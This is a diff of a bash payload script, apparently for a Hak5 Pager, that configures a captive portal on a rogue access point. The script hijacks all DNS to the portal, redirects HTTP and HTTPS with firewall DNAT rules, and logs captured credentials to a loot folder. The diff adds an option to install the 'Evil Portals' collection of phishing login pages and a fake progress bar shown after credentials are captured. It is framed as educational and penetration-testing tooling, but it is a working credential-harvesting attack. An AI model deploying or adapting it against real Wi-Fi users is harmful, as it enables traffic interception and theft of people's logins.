@@ -1,9 +1,9 @@
 #!/bin/bash
-# Name: goodportal Configure
+# Title: goodportal Configure
 # Description: Configure and start captive portal on lan interfaces
 # Purpose: Display educational captive portal page with no additional configuration
 # Author: spencershepard (GRIMM)
-# Version: 1.1
+# Version: 1.2
 
 # IMPORTANT!  As of Pager Firware 1.0.4 the opkg source list is broken with a missing repository.  
 # To fix, comment out or remove the offending line (Hak5) in /etc/opkg/distfeeds.conf before installing packages.
@@ -32,18 +32,43 @@
 #   - nginx (installed if missing)
 #   - php8-fpm (optional, installed if PHP files are detected in portal directory)
 
+# Changelog (update in README as well!):
+#   1.1 - Initial release
+#   1.2 - Added additional http firewall redirect rule
+#       - Fixed 'opkg update &&' chaining issue
+#       - Fixed Name -> Title metadata
+#       - Added warning about internet blocking on LAN (necessary for captive portal functionality)
+#       - Added installation option for pre-built Evil Portals collection (github.com/kleo/evilportals)
+#       - Redirect page after credential capture now waits for internet access instead of fixed delay (with fake progress bar)
+#       - Whitelist now uses IP addresses instead of MAC addresses
+
 # Todo:
 #   - add portal directory name to credentials log for easier identification
+#   - improve time delay after whitelisting and before client can access internet (currently 60+ seconds as of v1.2)
 
 BRIDGE_MASTER="br-lan"
 PORTAL_IP="172.16.52.1"
 PORTAL_ROOT="/www/goodportal"
 PAYLOAD_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 
+# Warn user about internet blocking
+resp=$(CONFIRMATION_DIALOG "WARNING: This payload will block internet access to clients on the LAN! Clients will NOT have internet access until credentials are entered (like a real captive portal). Internet blocking persists until 'goodportal Remove' payload is executed. Continue?")
+case $? in
+    $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
+        LOG "[INFO] User cancelled. Exiting."
+        exit 0
+        ;;
+esac
+
+if [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
+    LOG "[INFO] Aborting. No changes made."
+    exit 0
+fi
+
 # Check if nginx is installed
 if ! command -v nginx >/dev/null 2>&1; then
     LOG yellow "[WARNING] nginx is not installed."
-    resp=$(CONFIRMATION_DIALOG "Install nginx now?")
+    resp=$(CONFIRMATION_DIALOG "REQUIRED: Install nginx now? This may take several minutes.")
     case $? in
         $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
             LOG "[ERROR] Dialog rejected or error occurred"
@@ -52,8 +77,10 @@ if ! command -v nginx >/dev/null 2>&1; then
     esac
     
     if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
+        LOG "Updating package lists..."
+        opkg update
         LOG "Installing nginx..."
-        opkg update && opkg install nginx
+        opkg install nginx
         if ! command -v nginx >/dev/null 2>&1; then
             LOG "[ERROR] nginx installation failed. Please install manually."
             exit 1
@@ -77,6 +104,94 @@ for d in "$PORTAL_ROOT"/*/; do
         DIRS+=("$dname")
     fi
 done
+
+# Offer to install Evil Portals if only default exists
+if [ "${#DIRS[@]}" -eq 1 ]; then
+    LOG "Only default portal found"
+    resp=$(CONFIRMATION_DIALOG "OPTION: Install Evil Portals collection? This will install git (if needed) and clone pre-built portals from: github.com/kleo/evilportals")
+    case $? in
+        $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
+            LOG "  User declined Evil Portals installation"
+            ;;
+        *)
+            if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
+                LOG "Installing Evil Portals..."
+
+                LOG "Updating package lists..."
+                opkg update
+                
+                # Install git and required packages
+                GIT_PACKAGES="git git-http ca-certificates ca-bundle"
+                for pkg in $GIT_PACKAGES; do
+                    if ! opkg list-installed | grep -q "^${pkg} "; then
+                        LOG "    Installing $pkg..."
+                        opkg install "$pkg"
+                        if ! opkg list-installed | grep -q "^${pkg} "; then
+                            LOG red "    [ERROR] Failed to install $pkg"
+                        else
+                            LOG green "    Installed $pkg"
+                        fi
+                    else
+                        LOG "    $pkg already installed"
+                    fi
+                done
+                
+                if ! command -v git >/dev/null 2>&1; then
+                    LOG red "  [ERROR] git installation failed"
+                    ERROR_DIALOG "git installation failed! Cannot clone Evil Portals."
+                else
+                    LOG green "  git installed successfully"
+                fi
+
+                
+                # Clone Evil Portals repo to temp directory
+                if command -v git >/dev/null 2>&1; then
+                    CLONE_DIR="/tmp/evilportals-clone-$$"
+                    LOG "  Cloning repository to $CLONE_DIR..."
+                    
+                    if git clone https://github.com/kleo/evilportals.git "$CLONE_DIR" 2>&1 | while read line; do LOG "    $line"; done; then
+                        # Checkout specific commit
+                        cd "$CLONE_DIR"
+
+                        # Checkout known good commit
+                        git checkout 0fc1f052c5cff2befe84860cfb86befd1390962e 2>/dev/null  
+                        cd - >/dev/null
+                        
+                        # Copy portals directory
+                        if [ -d "$CLONE_DIR/portals" ]; then
+                            LOG "  Copying portals to $PORTAL_ROOT..."
+                            cp -r "$CLONE_DIR/portals/"* "$PORTAL_ROOT/" 2>/dev/null
+                            
+                            # Count how many were copied
+                            PORTAL_COUNT=$(find "$PORTAL_ROOT" -mindepth 1 -maxdepth 1 -type d ! -name "default" ! -name "captiveportal" | wc -l)
+                            LOG green "  SUCCESS: Installed $PORTAL_COUNT Evil Portals"
+                            
+                            # Clean up
+                            rm -rf "$CLONE_DIR"
+                            
+                            # Rescan directories
+                            DIRS=("default")
+                            for d in "$PORTAL_ROOT"/*/; do
+                                [ -e "$d" ] || continue
+                                dname=$(basename "$d")
+                                if [ -d "$d" ] && [ "$dname" != "default" ] && [ "$dname" != "captiveportal" ]; then
+                                    DIRS+=("$dname")
+                                fi
+                            done
+                        else
+                            LOG red "  [ERROR] portals directory not found in clone"
+                            rm -rf "$CLONE_DIR"
+                            ERROR_DIALOG "portals directory not found in cloned repository!"
+                        fi
+                    else
+                        LOG red "  [ERROR] git clone failed"
+                        rm -rf "$CLONE_DIR"
+                    fi
+                fi
+            fi
+            ;;
+    esac
+fi
 
 # Prompt user to select directory if more than one exists
 SELECTED_DIR="default"
@@ -143,7 +258,7 @@ if [ -n "$PHP_FILES" ]; then
     # Check if php8-fpm is installed
     if ! which php-fpm >/dev/null 2>&1 && ! ls /usr/bin/php-fpm* >/dev/null 2>&1 && ! opkg list-installed | grep -q php8-fpm; then
         LOG yellow "[WARNING] php-fpm is not installed. PHP files will not work."
-        resp=$(CONFIRMATION_DIALOG "Install PHP (php8 + php8-fpm) now?")
+        resp=$(CONFIRMATION_DIALOG "REQUIRED: Install PHP (php8 + php8-fpm) now? This may take several minutes.")
         case $? in
             $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
                 LOG "[INFO] Dialog rejected or error. Skipping PHP installation."
@@ -151,8 +266,10 @@ if [ -n "$PHP_FILES" ]; then
                 ;;
             *)
                 if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
+                    LOG "Updating package lists..."
+                    opkg update
                     LOG "Installing PHP packages..."
-                    opkg update && opkg install php8 php8-fpm php8-cgi
+                    opkg install php8 php8-fpm php8-cgi
                     if ! opkg list-installed | grep -q php8-fpm; then
                         LOG red "[ERROR] PHP installation failed. PHP files will not work."
                         exit 1
@@ -184,7 +301,7 @@ if [ -f /etc/nginx/nginx.conf ]; then
         if netstat -plant 2>/dev/null | grep -q ':80.*nginx'; then
             LOG "[WARNING] nginx is currently running with non-goodportal configuration"
             
-            resp=$(CONFIRMATION_DIALOG "Overwrite current nginx configuration?\n\nThis will replace your existing nginx setup with goodportal.\nA backup will be saved to nginx.conf.goodportal.bak")
+            resp=$(CONFIRMATION_DIALOG "Overwrite current nginx configuration? This will replace your existing nginx setup with goodportal. A backup will be saved to nginx.conf.goodportal.bak")
             case $? in
                 $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
                     LOG "[INFO] User cancelled. Exiting without changes."
@@ -399,7 +516,7 @@ if ! nginx -t 2>&1 | grep -q "test is successful"; then
         mv /etc/nginx/nginx.conf.goodportal.bak /etc/nginx/nginx.conf
     fi
     
-    ERROR_DIALOG "nginx configuration invalid!\nCheck logs for details."
+    ERROR_DIALOG "nginx configuration invalid! Check logs for details."
     exit 1
 fi
 LOG "  nginx configuration is valid"
@@ -411,6 +528,23 @@ sleep 2
 
 
 LOG "Configuring firewall NAT rules..."
+
+# Redirect HTTP traffic
+if ! uci show firewall | grep -q "name='GoodPortal HTTP lan'"; then
+    uci add firewall redirect
+    uci set firewall.@redirect[-1].name='GoodPortal HTTP lan'
+    uci set firewall.@redirect[-1].src='lan'
+    uci set firewall.@redirect[-1].src_dip="!$PORTAL_IP"
+    uci set firewall.@redirect[-1].proto='tcp'
+    uci set firewall.@redirect[-1].src_dport='80'
+    uci set firewall.@redirect[-1].dest_ip="$PORTAL_IP"
+    uci set firewall.@redirect[-1].dest_port='80'
+    uci set firewall.@redirect[-1].target='DNAT'
+    uci set firewall.@redirect[-1].enabled='1'
+    LOG "  Added HTTP redirect rule"
+else
+    LOG "  HTTP redirect rule already exists"
+fi
 
 # Redirect HTTPS to HTTP (captive portal on port 80)
 if ! uci show firewall | grep -q "name='GoodPortal HTTPS lan'"; then
@@ -482,7 +616,7 @@ fi
 kill $(netstat -plant 2>/dev/null | grep ':1053' | awk '{print $NF}' | sed 's/\/dnsmasq//g') 2>/dev/null
 
 # Start rogue DNS server
-dnsmasq --no-hosts --no-resolv --address=/#/${PORTAL_IP} -p 1053 --listen-address=0.0.0.0,::1 --bind-interfaces &
+dnsmasq --no-hosts --no-resolv --address=/#/${PORTAL_IP} --dns-forward-max=1 --cache-size=0 -p 1053 --listen-address=0.0.0.0,::1 --bind-interfaces &
 DNS_PID=$!
 echo "$DNS_PID" > /tmp/goodportal-dns.pid
 
@@ -559,17 +693,27 @@ if [ "$PHP_REQUIRED" -eq 1 ]; then
     fi
 fi
 
+# Verify DNS hijacking
+LOG "Verifying DNS hijacking..."
 if ! netstat -plant 2>/dev/null | grep -q ':1053'; then
-    LOG red "ERROR: DNS hijack not active"
+    LOG red "ERROR: DNS hijack not listening on port 1053"
     exit 1
+fi
+
+# Test actual DNS resolution (ignore stderr, REFUSED error is expected with --no-resolv)
+TEST_RESULT=$(nslookup -port=1053 google.com 127.0.0.1 2>&1 | grep "^Address:" | grep -v "127.0.0.1" | awk '{print $2}')
+if [ "$TEST_RESULT" = "$PORTAL_IP" ]; then
+    LOG green "SUCCESS: DNS hijacking active and resolving to portal IP"
+else
+    LOG yellow "[WARNING]: DNS test returned '$TEST_RESULT' (expected: $PORTAL_IP)"
 fi
 
 # Verify firewall rules 
 RULE_COUNT=$(uci show firewall | grep -c "GoodPortal.*lan")
-if [ "$RULE_COUNT" -eq 3 ]; then
-    LOG green "SUCCESS: All 3 firewall rules configured!"
+if [ "$RULE_COUNT" -eq 4 ]; then
+    LOG green "SUCCESS: All 4 firewall rules configured!"
 else
-    LOG red "ERROR: Expected 3 firewall rules, found $RULE_COUNT"
+    LOG red "ERROR: Expected 4 firewall rules, found $RULE_COUNT"
     exit 1
 fi
 
@@ -580,15 +724,16 @@ LOG "================================="
 LOG ""
 LOG "Testing:"
 LOG "  1. Connect client device to Open AP or Evil WPA"
-LOG "  2. Try to browse any website"
-LOG "  3. All traffic redirected to demo portal"
+LOG "  2. Observe wifi sign-in prompt in prompt on client device"
+LOG "  3. Verify captive portal page loads in browser"
 LOG ""
 LOG "Credentials saved to: /root/loot/goodportal/credentials_YYYY-MM-DD_HH-MM-SS.log"
 LOG ""
-LOG "NOTES:  Firewall rules will persist across reboot. Client whitelist will not."
-LOG " Run goodportal Remove payload for clean state"
-LOG " Run goodportal Configure again to restart after reboot."
-LOG " Run goodportal Configure to change portal directory."
+LOG yellow "NOTES:  Firewall rules will persist across reboot."
+LOG yellow " Run goodportal Remove payload for clean state"
+LOG yellow "'Connection refused' errors may be due to client DNS caching https."
+LOG " Run goodportal Configure again to restart after reboot or change portals. "
 LOG " Run goodportal Clear Whitelist to reset client whitelist." 
+LOG purple "Installed packages will persist, so running goodportal Configure again will be much faster after initial setup!"
 
 exit 0
